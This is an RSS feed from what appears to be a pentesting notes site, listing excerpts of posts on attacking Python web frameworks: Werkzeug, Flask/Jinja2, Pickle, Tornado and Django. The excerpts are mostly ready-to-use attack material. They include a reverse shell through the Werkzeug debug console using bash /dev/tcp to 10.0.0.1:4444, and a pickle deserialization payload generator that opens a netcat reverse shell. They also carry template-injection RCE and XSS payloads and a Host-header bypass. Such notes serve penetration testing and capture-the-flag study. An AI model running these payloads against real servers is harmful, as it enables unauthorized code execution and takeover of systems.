<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Python on D0CUM3NTN4T10N</title>
    <link>https://documentnation.github.io/docs/hdks/web/framework/python/</link>
    <description>Recent content in Python on D0CUM3NTN4T10N</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en</language>
    <lastBuildDate>Wed, 17 Jan 2024 16:14:30 +0530</lastBuildDate>
    <atom:link href="https://documentnation.github.io/docs/hdks/web/framework/python/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Werkzeug Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/framework/python/werkzeug-pentesting/</link>
      <pubDate>Mon, 02 Oct 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/framework/python/werkzeug-pentesting/</guid>
      <description>SSTI linkPlease see Flask Jinja2 SSTI&#xA;Remote Code Execution (RCE) in Console linkMetasploit link msfconsole msf&amp;gt; use exploit/multi/http/werkzeug_debug_rce Manual Exploitation linkIf we can access to /console page, we may be able to execute RCE.&#xA;__import__(&amp;#39;os&amp;#39;).popen(&amp;#39;whoami&amp;#39;).read(); import os; print(os.popen(&amp;#34;whoami&amp;#34;).read()) # Reverse shell __import__(&amp;#39;os&amp;#39;).popen(&amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/4444 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;).read() Console PIN Exploit linkReference: https://www.daehee.com/werkzeug-console-pin-exploit/&#xA;If the website is locked by PIN code in the /console page, you need to unlock it.</description>
    </item>
    <item>
      <title>Flask Jinja2 Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/framework/python/flask-jinja2-pentesting/</link>
      <pubDate>Fri, 22 Sep 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/framework/python/flask-jinja2-pentesting/</guid>
      <description>Common Directories link /app.py /main.py /modules.py /modules/__init__.py /modules/admin.py SSTI (Server-Side Template Injection) linkSometimes, website may filter specific characters.&#xA;If so, URL encode the payload or convert to HEX.&#xA;In addition, it’s recommended to send requests using Burp Suite because web browsers automatically update the payload.&#xA;First, try below payloads.&#xA;{{ 4*2 }} {{ config.items() }} # Remove curly brackets {2*3} 2*3 RCE linkIf success, we may be able to exploit with OS command injection.</description>
    </item>
    <item>
      <title>Python Pickle RCE</title>
      <link>https://documentnation.github.io/docs/hdks/web/framework/python/python-pickle-rce/</link>
      <pubDate>Thu, 10 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/framework/python/python-pickle-rce/</guid>
      <description>Exploitation linkBelow is the Python script (mypickle.py) to generate the payload to reverse shell.&#xA;import pickle import base64 import os class RCE: def __reduce__(self): cmd = (&amp;#39;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&amp;gt;&amp;amp;1 | nc 10.0.0.1 4444 &amp;gt; /tmp/f&amp;#39;) return os.system, (cmd,) if __name__ == &amp;#39;__main__&amp;#39;: pickled = pickle.dumps(RCE()) print(base64.b64encode(pickled)) # or print(base64.urlsafe_b64encode(pickled)) Now run this script to generate the Base64 payload.&#xA;python3 mypickle.py Copy the ourput base64 string and paste it to where the payload affects in website.</description>
    </item>
    <item>
      <title>Tornado Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/framework/python/tornado-pentesting/</link>
      <pubDate>Sun, 28 May 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/framework/python/tornado-pentesting/</guid>
      <description>Server-Side Template Injection (SSTI) linkWe can execute arbitrary Python script using the server-site template injection.&#xA;First check if the script will be executed as below.&#xA;&amp;lt;title&amp;gt;Website by {{ 2*3 }}&amp;lt;/title&amp;gt; &amp;lt;span&amp;gt;{{ 2*3 }}&amp;lt;/span&amp;gt; # URL parameters https://example.com/?q={{2*3}} If the website shows 6 instead of 2*3, we can execute arbitrary code.&#xA;Try following payloads.&#xA;{% import os %}{{ os.popen(&amp;#34;whoami&amp;#34;).read() }} # Reverse shell. Replace &amp;#34;10.0.0.1&amp;#34; with your own ip # It requires a listener like `nc -lvnp 4444` in local terminal.</description>
    </item>
    <item>
      <title>Django Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/framework/python/django-pentesting/</link>
      <pubDate>Sun, 19 Mar 2023 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/framework/python/django-pentesting/</guid>
      <description>SSTI (Server-Side Template Injection) link # XSS {{ `&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;` }} # Debug information {% debug %} Bypass ALLOWED_HOSTS linkIf we get the error “Invalid HTTP_HOST header: &amp;lsquo;x.x.x.x:8000&amp;rsquo;. You may need to add &amp;lsquo;x.x.x.x&amp;rsquo; to ALLOWED_HOSTS&amp;quot; when accessing the website written in Django, you need to intercept the value of the Host in the HTTP request header.&#xA;Then you should be able to access the website.&#xA;Host: 0.0.0.0:8000 # or Host: 127.</description>
    </item>
  </channel>
</rss>
